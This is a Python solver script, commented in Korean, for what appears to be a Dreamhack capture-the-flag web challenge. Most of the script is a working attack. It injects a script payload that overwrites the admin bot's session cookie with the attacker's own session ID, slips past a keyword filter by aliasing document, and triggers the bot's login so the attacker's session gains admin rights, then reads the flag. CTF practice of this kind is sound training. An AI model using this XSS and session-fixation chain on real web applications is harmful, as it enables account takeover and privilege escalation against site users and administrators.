import requests
import urllib.parse
import time

# 문제 서버 URL (환경에 맞게 수정하세요)
BASE_URL = "http://host8.dreamhack.games:12080" 
# 또는 로컬 테스트 시: "http://localhost:5000"

def solve():
    # 1. 세션 하나 생성 (Guest)
    # 그냥 접속만 해도 guest 세션이 생기거나, 명시적으로 로그인을 시도
    s = requests.Session()
    s.get(f"{BASE_URL}/login")
    
    my_sid = s.cookies.get("SESSION")
    if not my_sid:
        print("[-] 세션을 가져오지 못했습니다.")
        return

    print(f"[+] 내 세션 ID (Guest): {my_sid}")

    # 2. XSS Payload 구성
    # 필터 우회: document.cookie 문자열을 직접 쓰지 않고 변수 치환 사용
    # 주의: path=/ 설정을 해야 봇이 로그인할 때 쿠키가 전송됨
    js_payload = f'<script>d=document;d.cookie="SESSION={my_sid}; path=/";</script>'
    
    # URL 인코딩
    target_path = "/xss?payload=" + urllib.parse.quote(js_payload)
    
    print(f"[+] 봇에게 보낼 경로: {target_path}")

    # 3. 봇(/admin)에게 방문 요청
    # 봇은:
    # 1) / (root) 접속
    # 2) target_path (우리의 XSS) 접속 -> 쿠키가 내 세션ID로 변경됨
    # 3) 5초 대기
    # 4) /login (admin) 접속 -> 내 세션ID의 권한이 admin으로 상승
    admin_url = f"{BASE_URL}/admin?path={urllib.parse.quote(target_path)}"
    
    print("[*] 봇 실행 중... (약 5~7초 소요)")
    try:
        resp = requests.get(admin_url)
        if resp.status_code != 200:
            print("[-] 봇 실행 실패")
            return
    except Exception as e:
        print(f"[-] 봇 요청 중 에러: {e}")
        return

    # 4. 권한 상승 확인 및 플래그 획득
    # 봇이 내 세션(my_sid)을 admin으로 만들어줬을 것이므로, 나는 그 세션으로 /flag 조회
    flag_resp = s.get(f"{BASE_URL}/flag")
    
    if "DH{" in flag_resp.text or "flag" in flag_resp.text:
        print("\n[SUCCESS] FLAG 획득!")
        print(flag_resp.text)
    else:
        print("\n[-] 실패..")
        print(flag_resp.text)

if __name__ == "__main__":
    solve()